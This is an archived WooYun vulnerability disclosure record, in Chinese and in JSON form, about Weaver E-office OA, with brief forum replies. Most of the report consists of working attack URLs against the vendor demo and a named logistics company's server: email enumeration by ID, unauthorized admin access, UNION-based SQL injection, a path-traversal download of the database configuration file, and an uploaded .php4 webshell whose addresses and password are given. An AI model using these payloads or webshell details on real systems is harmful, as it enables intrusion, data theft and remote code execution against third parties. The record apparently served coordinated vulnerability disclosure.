{"id": 49170, "wybug_id": "wooyun-2014-074972", "wybug_title": "泛微OA漏洞集合（sql注入、未授权访问等）", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Coody", "wybug_date": "2014-09-04 12:00", "wybug_open_date": "2014-12-03 12:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向公众公开  简要描述： ... 详细说明：  \n0x00: 想说的一些废话\n下面出现的漏洞，据我了解还没有人报过，千万别说又跟什么什么漏洞重复了（点绝对不同）！ WooYun: 泛微E-office OA管理系统#  验证其通用性:SQL注入、任意文件下载、文件上传等漏洞 这里通过（1）官方演示 （2）某一案例 来演示其通用型。官方测试账户为 夏静，案例测试账户为 程琳。\n0x01：平行越权导致查看任意用户邮件信息\n问题链接：http://www.xxx.com/general/email/new/index.php?EMAIL_ID=7问题参数：EMAIL_ID问题说明：遍历参数EMAIL_ID的值，可查看他人邮件信息漏洞证明：（1）官方演示：http://eoffice8.weaver.cn:8028/general/email/new/index.php?EMAIL_ID=9503\n\nhttp://eoffice8.weaver.cn:8028/general/email/new/index.php?EMAIL_ID=9504\n\n（2）案例演示：http://www.sjd-logistics.com:8000/general/email/new/index.php?EMAIL_ID=726155\n\nhttp://www.sjd-logistics.com:8000/general/email/new/index.php?EMAIL_ID=726152\n\n\n0x02：纵向越权导致直接操作数据表\n问题链接：http://www.xxoo.com/ikernel/admin/问题说明：登录该OA系统后，可访问ikernel目录，但是系统提示“没有权限操作”，此时可直接访问ikernel/admin/目录，可对表结构及表本身进行操作。漏洞证明：（1）官方演示：有些显示的是乱码或显示不清楚，为方便截图进行了全选操作\n\n\n\n\n\n（2）案例演示：\n\n\n\n\n\n\n0x03：纵向越权导致的SQL注入漏洞\n问题链接：http://www.xxx.com/ikernel/admin/IK_TABLE/field/?TABLE_ID=9问题参数：TABLE_ID问题说明：这里貌似好多都存在注入，测试中只选取一点。虽gpc为on，但是数字型的不影响。漏洞证明：（1）官方演示：获取数据库当前用户 http://eoffice8.weaver.cn:8028/ikernel/admin/IK_TABLE/field/?TABLE_ID=9%20and%201=2%20union%20select%20user()\n\n获取当前数据库名称 http://eoffice8.weaver.cn:8028/ikernel/admin/IK_TABLE/field/?TABLE_ID=9%20and%201=2%20union%20select%20database()\n\n（2）案例演示：获取数据库当前用户 http://www.sjd-logistics.com:8000/ikernel/admin/IK_TABLE/field/?TABLE_ID=9%20and%201=2%20union%20select%20user()\n\n获取当前数据库名称 http://www.sjd-logistics.com:8000/ikernel/admin/IK_TABLE/field/?TABLE_ID=9%20and%201=2%20union%20select%20database()\n\n\n0x04：文件下载漏洞\n问题链接：http://www.xxx.com/general/notify/show/header.php?ATTACHMENT_ID=1738682577&FILE_NAME=../../inc/oa_config.php问题说明：下载是个zend加密的文件，可在网上进行解密。该文件中包含数据库链接文件。测试发现官方的已不是加密文件。（1）官方演示：http://eoffice8.weaver.cn:8028/general/notify/show/header.php?ATTACHMENT_ID=1738682577&FILE_NAME=../../inc/oa_config.php\n\n（2）案例演示：http://www.sjd-logistics.com:8000/general/notify/show/header.php?ATTACHMENT_ID=1738682577&FILE_NAME=../../inc/oa_config.php\n\n\n0x05：文件上传导致任意代码执行\n问题链接：http://www.xxx.com/general/email/问题说明：在【内部邮件】-【新建邮件】的附件处，可上传php4文件类型（官方demo中抓包改包可上传php4文件），通过查看源码找到对应的部分文件路径。最后webshell访问路径为 http://www.xxx.com/attachment/源码中找到的部分路径/文件名.php4（1）官方演示：得到的webshell地址为：http://eoffice8.weaver.cn:8028/attachment/1915193417/conf1g.php4 密码8\n\n\n\n（2）案例演示：得到的webshell地址为：http://www.sjd-logistics.com:8000/attachment/950753027/conf1g.php4 密码8\n\n\n\n   漏洞证明：  同上   修复方案：     版权声明：转载请注明来源 Coody@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-09 08:51 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-04 12:03 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  坐等    \n     2014-09-04 12:11 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  还没来得及弄泛微呢，我也坐等。    \n     2014-09-04 12:37 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  为什么我的没上首页走的小厂商呢，因为没把泛微写在标题上？    \n     2014-09-04 13:00 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  正在用    \n     2014-09-04 14:10 |    \t\t小歪 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:4        | 一直以蜗牛的速度在前行，但从不停歇。)\t\t \n  晕，手里一堆泛微的洞    \n     2014-09-04 14:49 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  你们都是大牛。    \n     2014-09-04 16:53 |    \t\treality0ne \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:7        )\t\t \n  没报通用吗。。最近眼里全是钱    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}